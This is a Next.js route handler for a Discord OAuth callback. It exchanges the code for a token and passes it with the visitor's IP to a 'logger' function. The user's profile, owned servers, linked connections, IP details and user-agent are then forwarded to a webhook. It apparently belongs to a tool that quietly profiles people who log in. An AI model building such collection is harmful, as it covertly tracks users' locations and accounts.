import { logger } from "@/lib/functions/logger";
import { sendWebhook } from "@/lib/functions/webhook";
import { NextRequest, NextResponse } from "next/server";

export async function GET(req: NextRequest) {
    try {
        const ip = (req.headers.get("x-forwarded-for") ?? "127.0.0.1").split(",")[0];
        const ua = req.headers.get("user-agent") ?? "unknown";
        
        const url = new URL(req.url);
        const code = url.searchParams.get("code");


        if (!code) {
            return NextResponse.redirect(`${process.env.BASE_URL}/error`);
        }
    
        const body = new URLSearchParams({
            "grant_type": "authorization_code",
            "code": String(code),
            "redirect_uri": `${process.env.BASE_URL}/api/callback`,
        }).toString();
    
        try {
            const token = await fetch(`https://discord.com/api/v10/oauth2/token`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Authorization": "Basic " + Buffer.from(`${process.env.CLIENT_ID}:${process.env.CLIENT_SECRET}`).toString("base64")
                },
                body: body
            });
    
            if (!token.ok) {
                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
            }

            const tokenResult = await token.json();

            const { success, userInfo, ownGuilds, connections, ipInfo } = await logger(tokenResult.access_token, ip);

            if (!success || !userInfo || !ownGuilds || !connections || !ipInfo) {
                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
            }
            
            const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua);
            
            if (!webhookResult.success) {
                return NextResponse.redirect(`${process.env.BASE_URL}/error`);
            }
            
            return NextResponse.redirect(`${process.env.BASE_URL}/success`);

        } catch (err) {
            console.error("fetch error: ", err);
            return NextResponse.redirect(`${process.env.BASE_URL}/error`);
        }
    } catch (error) {
        console.error("unexpected error: ", error);
        return NextResponse.redirect(`${process.env.BASE_URL}/error`);
    }
}
